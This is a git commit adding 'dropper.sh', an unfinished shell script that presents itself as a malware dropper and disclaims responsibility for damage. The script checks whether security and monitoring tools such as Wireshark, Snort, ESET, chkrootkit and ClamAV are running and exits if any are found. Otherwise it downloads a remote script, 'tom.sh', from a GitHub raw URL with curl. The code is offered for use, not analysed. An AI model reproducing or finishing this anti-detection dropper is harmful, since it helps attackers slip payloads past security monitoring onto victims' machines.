89106a00cde2be8c59df6bef3d556720cfb20149
dword <92415054+dwords@users.noreply.github.com>
2021-11-28 23:11:01 +0000

    This isn't ready for use dont install man

---
+++ dropper.sh
@@ -0,0 +1,62 @@
+#!/bin/sh 
+
+
+# ==============                    
+# Be a big boy, use this tool reponsibly. 
+# I do not care nor am responsible for any damages done.
+# ==============
+
+
+
+#Initializing environment 
+#Fetching Tom
+
+
+tom() {
+    url=https://raw.githubusercontent.com/dwords/sleepingtom/main/tom.sh 
+    curl -sS ${url} > tom.sh > /dev/null
+
+
+}
+
+#Attempting to detect monitors 
+
+monid() {
+
+    if pgrep -x "wireshark" > /dev/null;
+    then 
+       exit
+    elif pgrep -x "snort" > /dev/null;
+    then
+      exit 
+    elif pgrep -x "eset" > /dev/null;
+    then 
+       exit 
+    elif pgrep -x "chkrootkit" > /dev/null;
+    then 
+      exit 
+    elif pgrep -x "zabbix-agent" > /dev/null;
+    then 
+      exit 
+    elif pgrep -x "ettercap-common" > /dev/null;
+    then 
+      exit 
+    elif pgrep -x "ettercap" > /dev/null;
+    then 
+      exit 
+    elif pgrep -x "clamscan" > /dev/null;
+    then 
+      exit 
+    elif pgrep -x "netspot" > /dev/null;
+    then 
+    exit
+    else 
+    tom
+
+    fi
+}
+monid
+
+
+
+
